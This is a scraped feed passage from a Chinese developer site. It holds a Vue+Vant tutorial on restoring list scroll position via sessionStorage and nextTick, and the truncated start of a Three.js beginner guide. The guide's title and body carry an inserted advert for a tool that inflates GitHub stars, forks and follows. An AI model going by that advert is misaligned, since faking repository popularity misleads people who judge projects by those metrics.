100%;opacity:.36;background-repeat:no-repeat;background:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAMAAABEpIrGAAAABGdBTUEAALGPC/xhBQAAACBjSFJNAAB6JgAAgIQAAPoAAACA6AAAdTAAAOpgAAA6mAAAF3CculE8AAABfVBMVEX///8Ad/8AgP8AgP8AgP8Aff8AgP8Af/8AgP8AVf8Af/8Af/8AgP8AgP8Af/8Afv8AAP8Afv8Afv8Aef8AgP8AdP8Afv8AgP8AgP8Acf8Ae/8AgP8Af/8AgP8Af/8Af/8AfP8Afv8AgP8Af/8Af/8Afv8Afv8AgP8Afv8AgP8Af/8Af/8AgP8AgP8Afv8AgP8Af/8AgP8AgP8AgP8Ae/8Afv8Af/8AgP8Af/8AgP8Af/8Af/8Aff8Af/8Abf8AgP8Af/8AgP8Af/8Af/8Afv8AgP8AgP8Afv8Afv8AgP8Af/8Aff8AgP8Afv8AgP8Aff8AgP8AfP8AgP8Ae/8AgP8Af/8AgP8AgP8AgP8Afv8AgP8AgP8AgP8Afv8AgP8AgP8AgP8AgP8AgP8Af/8AgP8Af/8Af/8Aev8Af/8AgP8Aff8Afv8AgP8AgP8AgP8Af/8AgP8Af/8Af/8AgP8Afv8AgP8AgP8AgP8AgP8Af/8AeP8Af/8Af/8Af//////rzEHnAAAAfXRSTlMAD7CCAivatxIDx5EMrP19AXdLEwgLR+6iCR/M0yLRzyFF7JupSXn8cw6v60Q0QeqzKtgeG237HMne850/6Qeq7QaZ+WdydHtj+OM3qENCMRYl1B3K2U7wnlWE/mhlirjkODa9FN/BF7/iNV/2kASNZpX1Wlf03C4stRGxgUPclqoAAAABYktHRACIBR1IAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAB3RJTUUH4gEaBzgZ4yeM3AAAAT9JREFUOMvNUldbwkAQvCAqsSBoABE7asSOBRUVVBQNNuy9996789+9cMFAMHnVebmdm+/bmdtbQv4dOFOW2UjPzgFyLfo6nweKfIMOBYWwFtmMPGz2Yj2pJI0JDq3udJW6VVbmKa9I192VQFV1ktXUAl5NB0cd4KpnORqsEO2ZIRpF9gJfE9Dckqq0KuZt7UAH5+8EPF3spjsRpCeQNO/tA/qDwIDA+OCQbBoKA8NOdjMySgcZGVM6jwcgRuUiSs0nlPFNSrEpJfU0jTLD6llqbvKxei7OzvkFNQohi0vAsj81+MoqsCaoPOQFgus/1LyxichW+hS2JWCHZ7VlF9jb187pIAYcHiViHAMnp5mTjJ8B5xeEXF4B1ze/fTh/C0h398DDI9HB07O8ci+vRBdvdGnfP4gBuM8vw7X/G3wDmFhFZEdxzjMAAAAldEVYdGRhdGU6Y3JlYXRlADIwMTgtMDEtMjZUMDc6NTY6MjUrMDE6MDA67pVWAAAAJXRFWHRkYXRlOm1vZGlmeQAyMDE4LTAxLTI2VDA3OjU2OjI1KzAxOjAwS7Mt6gAAABl0RVh0U29mdHdhcmUAd3d3Lmlua3NjYXBlLm9yZ5vuPBoAAAAWdEVYdFRpdGxlAGp1ZWppbl9sb2dvIGNvcHlxapmKAAAAV3pUWHRSYXcgcHJvZmlsZSB0eXBlIGlwdGMAAHic4/IMCHFWKCjKT8vMSeVSAAMjCy5jCxMjE0uTFAMTIESANMNkAyOzVCDL2NTIxMzEHMQHy4BIoEouAOoXEXTyQjWVAAAAAElFTkSuQmCC)}.markdown-body h2{position:relative;font-size:20px;border-left:4px solid;padding:0 0 0 10px;margin:30px 0}.markdown-body h3{font-size:16px}.markdown-body ul{list-style:disc outside;margin-left:2em;margin-top:1em}.markdown-body li{line-height:2;color:#595959}.markdown-body img.loaded{margin:0 auto;display:block}.markdown-body blockquote{background:#fff9f9;margin:2em 0;padding:2px 20px;border-left:4px solid #b2aec5}.markdown-body blockquote p{color:#666;line-height:2}.markdown-body a{color:#036aca;border-bottom:1px solid rgba(3,106,202,.8);font-weight:400;text-decoration:none}.markdown-body em strong,.markdown-body strong{color:#036aca}.markdown-body hr{border-top:1px solid #135ce0}.markdown-body pre{overflow:auto}.markdown-body code,.markdown-body pre{overflow:auto;position:relative;line-height:1.75;font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body table{border-collapse:collapse;margin:1rem 0;overflow-x:auto}.markdown-body table td,.markdown-body table th{border:1px solid #dfe2e5;padding:.6em 1em}.markdown-body table tr{border-top:1px solid #dfe2e5}.markdown-body table tr:nth-child(2n){background-color:#f6f8fa}</style><style data-highlight="" data-highlight-key="an-old-hope">.hljs-comment,.hljs-quote{color:#b6b18b}.hljs-deletion,.hljs-name,.hljs-regexp,.hljs-selector-class,.hljs-selector-id,.hljs-tag,.hljs-template-variable,.hljs-variable{color:#eb3c54}.hljs-built_in,.hljs-builtin-name,.hljs-link,.hljs-literal,.hljs-meta,.hljs-number,.hljs-params,.hljs-type{color:#e7ce56}.hljs-attribute{color:#ee7c2b}.hljs-addition,.hljs-bullet,.hljs-string,.hljs-symbol{color:#4fb4d7}.hljs-section,.hljs-title{color:#78bb65}.hljs-keyword,.hljs-selector-tag{color:#b45ea4}.markdown-body pre,.markdown-body pre&gt;code.hljs{background:#1c1d21;color:#c0c5ce}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>在做移动端H5项目时，你一定遇到过这种糟糕的体验：</p>
<blockquote>
<p>从一个长列表点进详情，返回时列表又回到了顶部，用户只能一边默默吐槽一边重新往下滑......</p>
</blockquote>
<p>本文以一个实际业务页面为例，完整拆解：<strong>如何在Vue+Vant的无限滚动列表中，优雅地记录和恢复滚动位置</strong>，实现真正丝滑的返回体验。</p>
<h3 data-id="heading-0">1.场景与目标</h3>
<p>页面功能很简单：</p>
<ul>
<li>显示列表数据（支持搜索&amp;下拉加载更多）</li>
<li>点击列表项，跳转到详情页面</li>
<li>从详情页返回列表后，<strong>要停留在离开页面时的位置</strong>，而不是重新从顶部开始看</li>
</ul>
<p>但真正实现时，问题并不简单：</p>
<ol>
<li>列表是无限滚动的（van-list分页加载）</li>
<li>返回时数据需要重新加载（不能简单依赖浏览器历史缓存）</li>
<li>DOM更新是异步的，<strong>数据没加载够时根本滚不到原来的位置</strong></li>
</ol>
<h3 data-id="heading-1">2.实现思路总览</h3>
<p>核心思路可以拆成四步：</p>
<ol>
<li><strong>滚动容器引用</strong>：通过 <code>ref</code> 拿到列表 DOM 容器</li>
<li><strong>持久化滚动位置</strong>：离开前用 <code>sessionStorage</code> 记住 <code>scrollTop</code></li>
<li><strong>带状态加载列表</strong>：返回后边加载数据边判断「高度是否够滚到原位置」</li>
<li><strong>在合适时机恢复滚动</strong>：利用 <code>nextTick</code> 确保 DOM 高度就绪再设置 <code>scrollTop</code></li>
</ol>
<p>整体流程可以用一句话概括：</p>
<blockquote>
<p>「离开前存位置 → 回来先读位置 → 分页加载到足够高度 → 再一次性把滚动条拉回去」。</p>
</blockquote>
<p>下面结合具体代码来看。</p>
<h3 data-id="heading-2">3.关键状态：滚动位置与恢复标记</h3>
<p>首先在 <code>&lt;script setup&gt;</code> 中定义了几个与滚动相关的状态：</p>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-keyword">const</span> listAreaRef = ref&lt;<span class="hljs-title class_">HTMLElement</span> | <span class="hljs-literal">null</span>&gt;(<span class="hljs-literal">null</span>)
<span class="hljs-keyword">const</span> <span class="hljs-variable constant_">SCROLL_POSITION_KEY</span> = <span class="hljs-string">'teacher-list-scroll-position'</span>

<span class="hljs-comment">// 保存的滚动位置</span>
<span class="hljs-keyword">const</span> savedPosition = <span class="hljs-title function_">ref</span>(<span class="hljs-number">0</span>)

<span class="hljs-comment">// 是否正在进行滚动恢复加载</span>
<span class="hljs-keyword">const</span> isRestoringScroll = <span class="hljs-title function_">ref</span>(<span class="hljs-literal">false</span>)
</code></pre>
<ul>
<li><code>listAreaRef</code>：绑定到列表区域容器 DOM（用于读取和设置 <code>scrollTop</code>）</li>
<li><code>SCROLL_POSITION_KEY</code>：存储在 <code>sessionStorage</code> 中的 key</li>
<li><code>savedPosition</code>：记录之前滚动到的垂直位置</li>
<li><code>isRestoringScroll</code>：一个非常关键的标志，用来区分：
<ul>
<li>普通列表加载</li>
<li>为了恢复滚动而触发的「自动加载更多」</li>
</ul>
</li>
</ul>
<h3 data-id="heading-3">4.离开前：如何记录当前滚动位置？</h3>
<h4 data-id="heading-4">4.1 获取滚动容器</h4>
<pre><code class="hljs language-ts" lang="ts">&lt;div ref=<span class="hljs-string">"listAreaRef"</span> <span class="hljs-keyword">class</span>=<span class="hljs-string">"list-area flex-1 overflow-auto"</span>&gt;
  <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">van-list</span>
    <span class="hljs-attr">v-if</span>=<span class="hljs-string">"list.length &gt; 0"</span>
    <span class="hljs-attr">v-model:loading</span>=<span class="hljs-string">"loading"</span>
    <span class="hljs-attr">:finished</span>=<span class="hljs-string">"finished"</span>
    <span class="hljs-attr">finished-text</span>=<span class="hljs-string">"没有更多了"</span>
    <span class="hljs-attr">:immediate-check</span>=<span class="hljs-string">"false"</span>
    @<span class="hljs-attr">load</span>=<span class="hljs-string">"getList"</span>
  &gt;</span>
    <span class="hljs-comment">&lt;!-- 列表项... --&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">van-list</span>&gt;</span></span>
&lt;/div&gt;
</code></pre>
<p><code>ref="listAreaRef"</code> 让我们可以在脚本里拿到真正滚动的 DOM 元素，而不是整个窗口。</p>
<h4 data-id="heading-5">4.2 保存滚动位置</h4>
<p>保存滚动位置的方法非常直接：</p>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-keyword">const</span> <span class="hljs-title function_">saveScrollPosition</span> = (<span class="hljs-params"/>) =&gt; {
  <span class="hljs-keyword">if</span> (listAreaRef.<span class="hljs-property">value</span>) {
    <span class="hljs-keyword">const</span> scrollTop = listAreaRef.<span class="hljs-property">value</span>.<span class="hljs-property">scrollTop</span>
    sessionStorage.<span class="hljs-title function_">setItem</span>(<span class="hljs-variable constant_">SCROLL_POSITION_KEY</span>, scrollTop.<span class="hljs-title function_">toString</span>())
  }
}
</code></pre>
<p>调用时机选在<strong>离开列表前</strong>，例如点击列表项跳转到详情页时：</p>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-keyword">const</span> <span class="hljs-title function_">goToFaceUpload</span> = (<span class="hljs-params">teacher: ITeacherItem</span>) =&gt; {
  <span class="hljs-comment">// 保存当前滚动位置</span>
  <span class="hljs-title function_">saveScrollPosition</span>()

  router.<span class="hljs-title function_">push</span>({...})
}
</code></pre>
<p>这样，每一次从列表点进详情前，当前的滚动条位置都会被写入 <code>sessionStorage</code> 中。</p>
<h3 data-id="heading-6">5. 返回后：如何判断「要不要恢复」？</h3>
<p>列表页面挂载时（<code>onMounted</code>），会尝试读取之前保存的位置：</p>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-title function_">onMounted</span>(<span class="hljs-function">() =&gt;</span> {
  <span class="hljs-keyword">const</span> position = sessionStorage.<span class="hljs-title function_">getItem</span>(<span class="hljs-variable constant_">SCROLL_POSITION_KEY</span>)
  savedPosition.<span class="hljs-property">value</span> = position ? <span class="hljs-title class_">Number</span>(position) : <span class="hljs-number">0</span>

  <span class="hljs-comment">// 如果有保存的位置,启动滚动恢复流程</span>
  <span class="hljs-keyword">if</span> (savedPosition.<span class="hljs-property">value</span> &gt; <span class="hljs-number">0</span>) {
    isRestoringScroll.<span class="hljs-property">value</span> = <span class="hljs-literal">true</span>
  }
  <span class="hljs-comment">// ...</span>
})
</code></pre>
<p>这里有两个细节：</p>
<ol>
<li><code>savedPosition.value &gt; 0</code> 才认为需要恢复</li>
<li>一旦需要恢复，先把 <code>isRestoringScroll</code> 置为 <code>true</code>，再开始加载列表数据 <code>getList()</code></li>
</ol>
<p>这意味着：<strong>页面一进来，先不着急恢复滚动，而是先标记「我要恢复」，然后开始按正常流程拉数据</strong>。</p>
<h3 data-id="heading-7">6. 分页加载中：如何「加载到可以滚回那个位置」？</h3>
<p>核心逻辑在两个函数里：</p>
<ul>
<li><code>getList</code>：真正的分页接口请求</li>
<li><code>checkAndLoadMoreForScroll</code>：判断「高度够不够、要不要继续拉数据」</li>
</ul>
<h4 data-id="heading-8">6.1 每次加载完数据后的处理</h4>
<p><code>getList</code> 在成功获取数据后做了这些事：</p>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-keyword">const</span> <span class="hljs-title function_">getList</span> = <span class="hljs-keyword">async</span> (<span class="hljs-params"/>) =&gt; {
  <span class="hljs-keyword">try</span> {
    <span class="hljs-comment">// 省略 loading &amp; 接口请求...</span>

    <span class="hljs-comment">// 如果正在进行滚动恢复,继续检查</span>
    <span class="hljs-keyword">if</span> (isRestoringScroll.<span class="hljs-property">value</span>) {
      <span class="hljs-keyword">await</span> <span class="hljs-title function_">checkAndLoadMoreForScroll</span>()
    }

  } <span class="hljs-keyword">catch</span> (error) {
    <span class="hljs-comment">// 错误处理...</span>
    isRestoringScroll.<span class="hljs-property">value</span> = <span class="hljs-literal">false</span>
  }
}
</code></pre>
<blockquote>
<p>也就是说：<strong>只要当前处在「恢复模式」下，每拉完一次数据，就检查一下高度是否已经足够滚回原位置；如果不够，就继续拉下一页。</strong></p>
</blockquote>
<h4 data-id="heading-9">6.2 高度是否足够？<code>checkAndLoadMoreForScroll</code></h4>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-keyword">const</span> <span class="hljs-title function_">checkAndLoadMoreForScroll</span> = <span class="hljs-keyword">async</span> (<span class="hljs-params"/>) =&gt; {
  <span class="hljs-comment">// 如果没有保存的位置或已加载完所有数据,结束恢复流程</span>
  <span class="hljs-keyword">if</span> (!savedPosition.<span class="hljs-property">value</span> || finished.<span class="hljs-property">value</span>) {
    isRestoringScroll.<span class="hljs-property">value</span> = <span class="hljs-literal">false</span>
    <span class="hljs-keyword">await</span> <span class="hljs-title function_">nextTick</span>()
    <span class="hljs-title function_">restoreScrollPosition</span>()
    <span class="hljs-keyword">return</span>
  }

  <span class="hljs-comment">// 等待 DOM 更新</span>
  <span class="hljs-keyword">await</span> <span class="hljs-title function_">nextTick</span>()

  <span class="hljs-keyword">if</span> (!listAreaRef.<span class="hljs-property">value</span>) {
    isRestoringScroll.<span class="hljs-property">value</span> = <span class="hljs-literal">false</span>
    <span class="hljs-keyword">return</span>
  }

  <span class="hljs-keyword">const</span> scrollHeight = listAreaRef.<span class="hljs-property">value</span>.<span class="hljs-property">scrollHeight</span>
  <span class="hljs-keyword">const</span> clientHeight = listAreaRef.<span class="hljs-property">value</span>.<span class="hljs-property">clientHeight</span>
  <span class="hljs-keyword">const</span> maxScrollTop = scrollHeight - clientHeight

  <span class="hljs-comment">// 如果当前列表高度不足以滚动到保存的位置,继续加载</span>
  <span class="hljs-keyword">if</span> (savedPosition.<span class="hljs-property">value</span> &gt; maxScrollTop &amp;&amp; !finished.<span class="hljs-property">value</span>) {
    loading.<span class="hljs-property">value</span> = <span class="hljs-literal">true</span>
    <span class="hljs-keyword">await</span> <span class="hljs-title function_">getList</span>()
  } <span class="hljs-keyword">else</span> {
    <span class="hljs-comment">// 高度足够,恢复滚动位置</span>
    isRestoringScroll.<span class="hljs-property">value</span> = <span class="hljs-literal">false</span>
    <span class="hljs-title function_">restoreScrollPosition</span>()
  }
}
</code></pre>
<p>这里有几个关键点：</p>
<ol>
<li>
<p><strong>等待 DOM 更新</strong>：每次数据进来后，先 <code>await nextTick()</code>，确保 <code>scrollHeight</code> 是最新的</p>
</li>
<li>
<p><strong>判断最大可滚动高度</strong>：</p>
<ul>
<li><code>scrollHeight</code>：内容总高度</li>
<li><code>clientHeight</code>：可视区域高度</li>
<li><code>maxScrollTop = scrollHeight - clientHeight</code></li>
</ul>
</li>
<li>
<p><strong>比较保存位置与最大高度</strong>：</p>
<ul>
<li>如果 <code>savedPosition &gt; maxScrollTop</code>：说明当前内容还不够长，滚动条最多只能到 <code>maxScrollTop</code>，还达不到之前的位置 → 再拉一页数据</li>
<li>否则：说明当前内容高度已经足够 → 可以安全恢复到 <code>savedPosition</code></li>
</ul>
<p>这就完美解决了一个常被忽视的问题：</p>
</li>
</ol>
<blockquote>
<p><strong>不要在内容还不够高的时候就急着设置 scrollTop</strong>，否则恢复位置会失败或不准确。</p>
</blockquote>
<h3 data-id="heading-10">7. 恢复滚动：谨慎地设置<code>scrollTop</code></h3>
<p>最终真正操作滚动条的是 <code>restoreScrollPosition</code>：</p>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-keyword">const</span> <span class="hljs-title function_">restoreScrollPosition</span> = (<span class="hljs-params"/>) =&gt; {
  <span class="hljs-keyword">if</span> (savedPosition.<span class="hljs-property">value</span> &amp;&amp; listAreaRef.<span class="hljs-property">value</span>) {
    <span class="hljs-title function_">nextTick</span>(<span class="hljs-function">() =&gt;</span> {
      <span class="hljs-keyword">if</span> (listAreaRef.<span class="hljs-property">value</span>) {
        listAreaRef.<span class="hljs-property">value</span>.<span class="hljs-property">scrollTop</span> = savedPosition.<span class="hljs-property">value</span>
      }
    })
  }
}
</code></pre>
<p>可以看到这里又包了一层 <code>nextTick()</code>：</p>
<ul>
<li><code>checkAndLoadMoreForScroll</code> 里已经 <code>await nextTick()</code> 了一次</li>
<li>在真正设置 <code>scrollTop</code> 时，再套一层 <code>nextTick</code></li>
</ul>
<p>这种「双层 nextTick」虽然看起来有点啰嗦，但在复杂场景（比如有图片加载、组件内部还在做渲染）的情况下，能进一步提高成功恢复的可靠性。</p>
<h3 data-id="heading-11">8. 何时清除保存的滚动位置？</h3>
<p>考虑了「用户主动返回上一页」这种场景：</p>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-keyword">const</span> <span class="hljs-title function_">handleBack</span> = (<span class="hljs-params"/>) =&gt; {
  sessionStorage.<span class="hljs-title function_">removeItem</span>(<span class="hljs-variable constant_">SCROLL_POSITION_KEY</span>)
}
</code></pre>
<ul>
<li>从列表<strong>返回更上级页面</strong>时，不需要再保留这段滚动状态</li>
<li>再次进入列表时就是一次全新的浏览</li>
</ul>
<p>业务上的行为边界也被清晰地区分了出来。</p>
<h3 data-id="heading-12">9. 写在最后</h3>
<p>如果你项目里也有「带搜索 + 分页加载 + 跳详情」的长列表，这种方式可以无痛提升用户体验。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[github star 加星多的从 React 到 Web3D：前端开发者的三维世界入门指南]]></title>    <link>https://juejin.cn/post/7592944032772915251</link>    <guid>https://juejin.cn/post/7592944032772915251</guid>    <pubDate>2026-01-09T03:25:40.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592944032772915251" data-draft-id="7592992745573171238" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="github star 加星多的从 React 到 Web3D：前端开发者的三维世界入门指南"/> <meta itemprop="keywords" content="JavaScript,面试"/> <meta itemprop="datePublished" content="2026-01-09T03:25:40.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="开源之眼"/> <meta itemprop="url" content="https://juejin.cn/user/55438993800919"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            github star 加星多的从 React 到 Web3D：前端开发者的三维世界入门指南
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/55438993800919/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    开源之眼
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-09T03:25:40.000Z" title="Fri Jan 09 2026 03:25:40 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-09
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读7分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>当你在会议室里为需求细节争论不休时，智慧工厂的数字孪生正同步着每一条产线的实时脉搏；当你对着二维平面图脑补空间布局时，智慧小区的三维模型已在虚拟世界精准复刻每一扇窗的采光角度；当你在 CAD 里反复调整参数时，数字孪生城市的交通流正实时映射每辆车的行驶轨迹。</p>
<h4 data-id="heading-0">Taimili 艾米莉 ( 一款专业的 GitHub star 管理和github 加星涨星工具<a href="https://link.juejin.cn?target=taimili.com" title="https://link.juejin.cn?target=taimili.com" target="_blank">taimili.com</a> )</h4>
<p>艾米莉 是一款优雅便捷的 GitHub star 管理和github 加星涨星工具，基于 PHP &amp; javascript 构建， 能对github 得 star fork follow watch 管理和提升，最适合github 的深度用户</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d063ea140bec4310b6916716fa297407~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5byA5rqQ5LmL55y8:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768533940&amp;x-signature=59gqNo3npj2aY95XIUmP%2BgSDeo8%3D" alt="WX20251021-210346@2x.png" loading="lazy"/></p>
<h2 data-id="heading-1"/>
<p>作者：开源之眼<br/>
链接：<a href="https://juejin.cn/post/7592822714068484147" target="_blank" title="https://juejin.cn/post/7592822714068484147">juejin.cn/post/759282…</a><br/>
来源：稀土掘金<br/>
著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。
从机械臂的 3D 仿真预演十万次零误差运动路径，到可交互 3D 引擎让客户直观拆解每一个齿轮；从 AR 动态指引覆盖所有售后故障点，到 VR 漫游让业主提前 "推开" 设计的门窗；从光影引擎精准计算午后 3 点的温柔折射，到材质参数的实时可视化调整 ——Web3D 正在重构我们与数字世界的交互方式。</p>
<p>对前端开发者而言，从 React 转向 Web3D 从来不是换条赛道，而是打开全新维度。正如韩老师所说：再牛的程序员都是从小白起步，既然选择出发，便全心投入深耕技术。下面这份 Three.js 入门指南，带你快速踏入三维开发的大门。</p>
<h2 data-id="heading-2">核心工具与文档</h2>
<p>Three.js 作为 Web3D 开发的核心工具，其官方文档支持中文切换，所有 API 都能在文档中快速检索。只需掌握场景、相机、物体、渲染器四大基础组件，就能搭建起第一个 3D 应用。</p>
<h2 data-id="heading-3">基础核心：搭建你的第一个 3D 场景</h2>
<h3 data-id="heading-4">1. 场景（Scene）</h3>
<p>场景是 Three.js 的核心容器，相当于 3D 世界的 "舞台"—— 用于放置物体、灯光和相机，是所有可视化元素的承载基础。</p>
<p>javascript</p>
<p>运行</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">import</span> * <span class="hljs-keyword">as</span> <span class="hljs-variable constant_">THREE</span> <span class="hljs-keyword">from</span> <span class="hljs-string">"three"</span>;

<span class="hljs-comment">// 创建3D场景</span>
<span class="hljs-keyword">const</span> scene = <span class="hljs-keyword">new</span> <span class="hljs-variable constant_">THREE</span>.<span class="hljs-title class_">Scene</span>();
</code></pre>
<h3 data-id="heading-5">2. 相机（Camera）</h3>
<p>相机决定了我们观察 3D 世界的视角，就像人的眼睛。常用的透视相机（PerspectiveCamera）模拟人眼成像原理，通过四个参数定义观察范围：</p>
<p>javascript</p>
<p>运行</p>
<pre><code class="hljs language-dart" lang="dart"><span class="hljs-comment">// 创建透视相机</span>
<span class="hljs-keyword">const</span> camera = <span class="hljs-keyword">new</span> THREE.PerspectiveCamera(
  <span class="hljs-number">75</span>, <span class="hljs-comment">// 视野角度（单位：度）</span>
  <span class="hljs-built_in">window</span>.innerWidth / <span class="hljs-built_in">window</span>.innerHeight, <span class="hljs-comment">// 宽高比（与窗口保持一致）</span>
  <span class="hljs-number">0.1</span>, <span class="hljs-comment">// 近截面（最近可见距离）</span>
